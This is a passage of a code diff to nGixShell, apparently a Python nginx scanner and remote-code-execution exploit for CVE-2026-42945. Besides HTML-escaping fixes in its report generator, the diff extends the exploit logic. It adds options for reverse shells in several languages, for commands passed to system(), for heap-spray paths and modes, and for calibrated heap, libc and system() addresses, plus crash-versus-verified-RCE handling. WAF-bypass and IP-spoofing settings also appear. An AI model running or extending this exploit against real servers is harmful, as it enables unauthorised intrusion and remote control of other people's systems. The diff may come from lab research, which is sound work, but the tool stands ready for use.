+            fp_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{e(k)}</td><td>{e(v)}</td></tr>"
         fp_html += "</table>"
 
     # Web audit sections
@@ -2405,9 +2510,9 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
             web_html += "<h2>Header Security Audit</h2><table><tr><th>Header</th><th>Severity</th><th>Issue</th></tr>"
             for iss in hdr_issues:
                 sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
-                web_html += (f"<tr><td>{iss['header']}</td>"
-                             f"<td style='color:{sc}'>{iss['severity']}</td>"
-                             f"<td>{iss['issue']}</td></tr>")
+                web_html += (f"<tr><td>{e(iss['header'])}</td>"
+                             f"<td style='color:{sc}'>{e(iss['severity'])}</td>"
+                             f"<td>{e(iss['issue'])}</td></tr>")
             web_html += "</table>"
 
         # Paths found
@@ -2417,7 +2522,7 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
             for p in paths_found:
                 sc = "#ff8800" if p["status"] == 200 else "#ffcc00"
                 web_html += (f"<tr><td style='color:{sc}'>{p['status']}</td>"
-                             f"<td>{p['path']}</td><td>{p['note']}</td></tr>")
+                             f"<td>{e(p['path'])}</td><td>{e(p['note'])}</td></tr>")
             web_html += "</table>"
 
         # Virtual hosts
@@ -2425,8 +2530,8 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
         if vhosts_found:
             web_html += "<h2>Virtual Hosts Detected</h2><table><tr><th>VHost</th><th>Status</th><th>Note</th></tr>"
             for vh in vhosts_found:
-                web_html += (f"<tr><td style='color:#58a6ff'>{vh['vhost']}</td>"
-                             f"<td>{vh['status']}</td><td>{vh['note']}</td></tr>")
+                web_html += (f"<tr><td style='color:#58a6ff'>{e(vh['vhost'])}</td>"
+                             f"<td>{vh['status']}</td><td>{e(vh['note'])}</td></tr>")
             web_html += "</table>"
 
         # TLS issues
@@ -2436,8 +2541,8 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
             web_html += "<h2>TLS Issues</h2><table><tr><th>Severity</th><th>Issue</th></tr>"
             for iss in tls_issues:
                 sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
-                web_html += (f"<tr><td style='color:{sc}'>{iss['severity']}</td>"
-                             f"<td>{iss['issue']}</td></tr>")
+                web_html += (f"<tr><td style='color:{sc}'>{e(iss['severity'])}</td>"
+                             f"<td>{e(iss['issue'])}</td></tr>")
             web_html += "</table>"
 
         # stub_status
@@ -2454,23 +2559,23 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
             waf_color = "#ff4444" if waf.get("detected") else "#44aa44"
             waf_label = waf.get("waf") or "None detected"
             waf_conf  = waf.get("confidence", "")
-            web_html += f"<h2>WAF Detection</h2><table>"
+            web_html += "<h2>WAF Detection</h2><table>"
             web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Detected</td>"
                          f"<td style='color:{waf_color};font-weight:bold'>"
-                         f"{'YES — ' + waf_label if waf.get('detected') else 'No WAF detected'}</td></tr>")
+                         f"{e('YES — ' + waf_label) if waf.get('detected') else 'No WAF detected'}</td></tr>")
             if waf_conf:
                 web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Confidence</td>"
                              f"<td>{waf_conf}</td></tr>")
             for ev in waf.get("evidence", []):
                 web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Evidence</td>"
-                             f"<td>{ev}</td></tr>")
+                             f"<td>{e(ev)}</td></tr>")
             web_html += "</table>"
 
     total_issues = len(findings) + len(web_audit.get("header_issues", []) if web_audit else [])
 
     with open(path, "w", encoding="utf-8") as f:
         f.write(f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<title>nGixShell — {host}:{port}</title>
+<title>nGixShell — {e(host)}:{e(port)}</title>
 <style>
 body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:24px;margin:0}}
 h1{{color:#00e676;letter-spacing:2px}}h2{{color:#58a6ff;margin-top:32px;border-bottom:1px solid #30363d;padding-bottom:6px}}
@@ -2481,7 +2586,7 @@ tr:hover td{{background:#161b22}}.meta{{color:#8b949e;margin-bottom:24px;font-si
 </style></head><body>
 <h1>nGixShell — Web Security Report</h1>
 <div class="meta">
-  Target: <strong>{host}:{port}</strong> &nbsp;|&nbsp;
+  Target: <strong>{e(host)}:{e(port)}</strong> &nbsp;|&nbsp;
   Generated: {ts} &nbsp;|&nbsp;
   Elapsed: {elapsed:.1f}s &nbsp;|&nbsp;
   Total issues: {total_issues}
@@ -2529,7 +2634,7 @@ def _build_json_output(host, port, findings, fingerprint=None,
 # ─── Entry point ──────────────────────────────────────────────────────────────
 
 def main() -> int:
-    global _verbose, _tmul, _log_fh, _user_agent, _extra_headers
+    global _verbose, _tmul, _log_fh, _user_agent
     global _jitter_ms, _retry_count, _rate_limiter
     global _waf_bypass, _waf_spoof_ip
 
@@ -2578,13 +2683,21 @@ Usage examples
     # ── Exploit ───────────────────────────────────────────────────────────────
     ex = parser.add_argument_group("exploit (CVE-2026-42945)")
     ex.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
-    ex.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
+    ex.add_argument("--cmd-file", metavar="FILE",
+                    help="file with commands, one per line (joined with '; ' and "
+                         "passed to system() as a single command)")
     ex.add_argument("--shell",    action="store_true", help="pop a reverse shell")
     ex.add_argument("--shell-type", metavar="TYPE", default="python",
                     choices=["bash", "python", "perl", "php", "nc", "powershell"],
                     help="reverse shell payload type (default: python)")
     ex.add_argument("--upgrade-shell", action="store_true",
                     help="auto-send PTY upgrade after shell connects")
+    ex.add_argument("--verify-url", metavar="URL",
+                    help="URL fetched after a detected crash to confirm the command's "
+                         "effect (HTTP 200 = RCE verified)")
+    ex.add_argument("--continue-on-crash", action="store_true",
+                    help="keep trying the remaining heap candidates after an "
+                         "unverified crash (a crash alone is not RCE)")
 
     # ── Modes ─────────────────────────────────────────────────────────────────
     sp = parser.add_argument_group("special modes")
@@ -2654,9 +2767,21 @@ Usage examples
                     help="nginx location with a rewrite rule that captures $1 "
                          "(e.g. /r, /api, /search) — must match a 'rewrite … $1' "
                          "block in the target's nginx.conf (default: /api)")
+    tu.add_argument("--spray-path", metavar="PATH", default="/upload",
+                    help="proxy_pass-backed location used for the POST-body heap "
+                         "spray (default: /upload)")
+    tu.add_argument("--spray-mode", choices=["partial", "full"], default="partial",
+                    help="partial: short body + large Content-Length (bundled lab); "
+                         "full: complete body + X-Delay (DepthFirst lab)")
     tu.add_argument("--build", metavar="KEY",
-                    help=f"pre-computed build profile. known keys: "
-                         + ", ".join(k for k in KNOWN_BUILDS if k != "_default"))
+                    help="pre-computed build profile. known keys: "
+                         + (", ".join(k for k in KNOWN_BUILDS if k != "_default") or "none"))
+    tu.add_argument("--build-file", metavar="FILE",
+                    help="JSON calibration profile produced by "
+                         "'calibrate.py --json -o FILE' (recommended)")
+    tu.add_argument("--offsets", metavar="SPEC",
+                    help="comma-separated hex heap offsets from calibrate.py "
+                         "(e.g. '0x5a427,0x60e67')")
     tu.add_argument("--heap-base",   metavar="HEX",
                     help="override HEAP_BASE (hex, e.g. 0x5555556cc000). "
                          "Requires ASLR disabled on target.")
@@ -2759,6 +2884,7 @@ Usage examples
         all_findings     = []
         all_fingerprints = []
         all_web_audits   = []
+        per_target       = []
 
         for t_host, t_port, tls_forced in raw_targets:
             if len(raw_targets) > 1:
@@ -2782,17 +2908,49 @@ Usage examples
 
             # ── Apply build profile / CLI address overrides ───────────────────
             if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
-                fp_ver = fingerprint_target(t_host, t_port, use_tls, args.proxy).get("server", "")
+                fp_info  = fingerprint_target(t_host, t_port, use_tls, args.proxy)
+                fp_ver   = fp_info.get("server_header") or ""
                 auto_key = _auto_select_build(fp_ver)
-                build_key = getattr(args, "build", None) or auto_key
-                if build_key:
+                build_key = args.build or auto_key
+                if args.build_file:
+                    try:
+                        calib = load_calibration(args.build_file)
+                    except Exception as exc:
+                        log(f"[!] Cannot load calibration '{args.build_file}': {exc}")
+                        return 1
+                else:
+                    calib = None
+                if calib:
+                    log(f"[*] Calibration : {args.build_file}")
+                elif build_key:
                     log(f"[*] Build profile : {build_key}")
+                else:
+                    log("[!] No calibrated profile for this target — falling back to the")
+                    log("    built-in reference values (DepthFirst Nginx-Rift lab only).")
+                    log("    Calibrate with: python3 calibrate.py HOST PORT WORKER_PID --json -o p.json")
                 _apply_build(
                     build_key,
-                    heap_base   = int(args.heap_base,   16) if getattr(args, "heap_base",   None) else None,
-                    libc_base   = int(args.libc_base,   16) if getattr(args, "libc_base",   None) else None,
-                    system_addr = int(args.system_addr, 16) if getattr(args, "system_addr", None) else None,
+                    heap_base   = int(args.heap_base,   16) if args.heap_base   else None,
+                    libc_base   = int(args.libc_base,   16) if args.libc_base   else None,
+                    system_addr = int(args.system_addr, 16) if args.system_addr else None,
+                    offsets     = parse_offsets(args.offsets) if args.offsets else None,
                 )
+                if calib:
+                    _apply_build(None,
+                                 heap_base=calib["heap_base"],
+                                 libc_base=calib["libc_base"],
+                                 system_addr=calib["system_addr"],
+                                 offsets=calib["offsets"])
+                    if calib.get("spray_count") and args.spray < int(calib["spray_count"]):
+                        args.spray = int(calib["spray_count"])
+                        log(f"[*] --spray raised to {args.spray} "
+                            f"(calibration used that many connections)")
+                    if calib.get("spray_path") and args.spray_path == "/upload":
+                        args.spray_path = calib["spray_path"]
+                        log(f"[*] Using calibrated spray path {args.spray_path}")
+                    if calib.get("spray_mode"):
+                        args.spray_mode = calib["spray_mode"]
+                        log(f"[*] Using calibrated spray mode {args.spray_mode}")
                 log(f"[*] HEAP_BASE   = 0x{HEAP_BASE:x}")
                 log(f"[*] LIBC_BASE   = 0x{LIBC_BASE:x}")
                 log(f"[*] SYSTEM_ADDR = 0x{SYSTEM_ADDR:x}")
@@ -2843,12 +3001,14 @@ Usage examples
                     return 1
                 log("[+] Connected.")
 
-                success = winner_addr = winner_try = None
+                success = winner_addr = winner_try = verified = None
+                crashed_addrs = []
                 total_attempts = candidates_tried = 0
 
                 for ci, (_, addr) in enumerate(candidates):
                     target_b = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
                     candidates_tried += 1
+                    stop = False
                     for an in range(args.tries):
                         total_attempts += 1
                         log(f"  [cand {ci+1}/{len(candidates)}] [try {an+1}/{args.tries}] 0x{addr:012x}")
@@ -2859,32 +3019,67 @@ Usage examples
                                 return 1
                         if attempt(t_host, t_port, target_b, body,
                                    args.spray, args.body_len, use_tls, args.proxy,
-                                   rewrite_path=args.rewrite_path):
-                            success     = True
-                            winner_addr = addr
-                            winner_try  = an + 1
+                                   rewrite_path=args.rewrite_path,
+                                   spray_path=args.spray_path,
+                                   spray_mode=args.spray_mode):
+                            winner_try = an + 1
                             if args.shell:
+                                success     = True
+                                winner_addr = addr
                                 log("[+] Crash — waiting for shell (Ctrl+C to exit)...")
                                 try:
                                     while True: _sleep(1)
                                 except KeyboardInterrupt:
                                     pass
+                                stop = True
                             else:
-                                log(f'[+] system("{cmd}") executed')
-                            log("[+] Done.")
-                            break
+                                log(f"[!] Worker crash detected (candidate 0x{addr:012x})")
+                                log(f"    Command injected: {cmd}")
+                                log("    NOTE: a crash means the overflow reached the pool cleanup")
+                                log("    pointer, but it does NOT by itself prove code execution.")
+                                if args.verify_url and _verify_effect(
+                                        args.verify_url, use_tls, args.proxy):
+                                    verified    = True
+                                    success     = True
+                                    winner_addr = addr
+                                    log("[+] Verification URL confirms the command ran — RCE OK")
+                                    stop = True
+                                elif args.continue_on_crash:
+                                    log("[*] --continue-on-crash: moving to the next candidate")
+                                    crashed_addrs.append(addr)
+                                else:
+                                    success     = True
+                                    winner_addr = addr
+                                    log("    Confirm side effects manually (e.g. a command that")
+                                    log("    creates a file in the docroot) or pass --verify-url,")
+                                    log("    or use --continue-on-crash to try every candidate.")
+                                    stop = True
+                            if stop:
+                                log("[+] Done.")
+                                break
                         _sleep(0.3)
-                    if success:
+                    if stop:
                         break
 
-                if not success:
+                if not success and crashed_addrs:
+                    log(f"[!] {len(crashed_addrs)} candidate(s) crashed the worker, "
+                        f"but none was verified as code execution.")
+                elif not success:
                     log("[+] All candidates tried — no crash detected.")
 
                 elapsed = time.monotonic() - start
+                if success and verified:
+                    verdict = "VERIFIED RCE"
+                elif success:
+                    verdict = "CRASH DETECTED (execution unconfirmed)"
+                elif crashed_addrs:
+                    verdict = f"NO VERIFIED RCE ({len(crashed_addrs)} unverified crashes)"
+                else:
+                    verdict = "NO CRASH"
                 log(f"\n{'═'*60}\n  EXPLOIT REPORT\n{'═'*60}")
                 log(f"  Target  : {t_host}:{t_port}")
                 log(f"  Command : {cmd}")
-                log(f"  Result  : {'SUCCESS' if success else 'FAILURE'}")
+                log(f"  Result  : {verdict}")
                 log(f"  Elapsed : {elapsed:.1f}s")
                 if winner_addr:
                     log(f"  Address : 0x{winner_addr:012x}  (try {winner_try})")
@@ -2893,6 +3088,8 @@ Usage examples
 
             # ── Auto / scan mode ──────────────────────────────────────────────
             fp      = fingerprint_target(t_host, t_port, use_tls, args.proxy)
+            if fp.get("error"):
+                log(f"[!] Fingerprint failed: {fp['error']} — continuing anyway")
             version = fp.get("version_tuple")
             findings = cve_scan(t_host, t_port, use_tls, args.proxy,
                                 target_cve=args.cve if args.cve else None,
@@ -2908,30 +3105,8 @@ Usage examples
             if not args.skip_paths:
                 web_audit["paths_found"] = path_discovery(
                     t_host, t_port, use_tls, args.proxy, extra_paths)
-                # Parse stub_status if found in paths
-                stub_entry = next(
-                    (p for p in web_audit["paths_found"]
-                     if p["path"] in ("/nginx_status", "/nginx-status") and p["status"] == 200),
-                    None
-                )
-                if stub_entry and stub_entry.get("body_preview"):
-                    text = stub_entry["body_preview"]
-                    stub = {}
-                    m = re.search(r"Active connections:\s*(\d+)", text)
-                    if m: stub["active_connections"] = int(m.group(1))
-                    m = re.search(r"(\d+)\s+(\d+)\s+(\d+)", text)
-                    if m:
-                        stub["accepts"]  = int(m.group(1))
-                        stub["handled"]  = int(m.group(2))
-                        stub["requests"] = int(m.group(3))
-                    m = re.search(r"Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)", text)
-                    if m:
-                        stub["reading"] = int(m.group(1))
-                        stub["writing"] = int(m.group(2))
-                        stub["waiting"] = int(m.group(3))
-                    web_audit["stub_status"] = stub
-                else:
-                    web_audit["stub_status"] = {}
+                web_audit["stub_status"] = check_stub_status(
+                    t_host, t_port, use_tls, args.proxy)
 
             if not args.skip_vhosts:
                 web_audit["vhosts_found"] = vhost_enum(
@@ -2948,6 +3123,8 @@ Usage examples
             all_findings.extend(findings)
             all_fingerprints.append(fp)
             all_web_audits.append(web_audit)
+            per_target.append({"host": t_host, "port": t_port, "fp": fp,
+                               "web_audit": web_audit, "findings": findings})
 
         # ── Post-loop output ──────────────────────────────────────────────────
         elapsed = time.monotonic() - start
@@ -2955,18 +3132,42 @@ Usage examples
         fp0     = all_fingerprints[0] if all_fingerprints else None
         wa0     = all_web_audits[0]   if all_web_audits   else None
 
+        multi = len(per_target) > 1
+
         if args.json:
-            obj = _build_json_output(h0, p0, all_findings, fp0, wa0, elapsed)
-            if len(raw_targets) > 1:
-                obj["all_targets"] = [{"host": h, "port": p} for h, p, _ in raw_targets]
+            if multi:
+                obj = {
+                    "tool":      "nGixShell",
+                    "timestamp": datetime.datetime.now(datetime.timezone.utc)
+                                         .isoformat().replace("+00:00", "Z"),
+                    "targets":   [
+                        _build_json_output(t["host"], t["port"], t["findings"],
+                                           t["fp"], t["web_audit"], elapsed)
+                        for t in per_target
+                    ],
+                }
+            else:
+                obj = _build_json_output(h0, p0, all_findings, fp0, wa0, elapsed)
             print(json.dumps(obj, indent=2, ensure_ascii=False))
 
         if args.html_report:
-            html_path = args.html_report
-            if html_path == "ngixshell_report.html":
-                ts        = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
-                html_path = f"ngixshell_{h0}_{ts}.html"
-            generate_html_report(h0, p0, all_findings, fp0, wa0, elapsed, html_path)
+            ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
+            if multi:
+                for t in per_target:
+                    if args.html_report == "ngixshell_report.html":
+                        html_path = f"ngixshell_{t['host']}_{t['port']}_{ts}.html"
+                    else:
+                        root, dot, ext = args.html_report.rpartition(".")
+                        html_path = (f"{root}_{t['host']}_{t['port']}.{ext}"
+                                     if dot else
+                                     f"{args.html_report}_{t['host']}_{t['port']}.html")
+                    generate_html_report(t["host"], t["port"], t["findings"],
+                                         t["fp"], t["web_audit"], elapsed, html_path)
+            else:
+                html_path = args.html_report
+                if html_path == "ngixshell_report.html":
+                    html_path = f"ngixshell_{h0}_{ts}.html"
+                generate_html_report(h0, p0, all_findings, fp0, wa0, elapsed, html_path)
 
         return 0 if not all_findings else 1
 
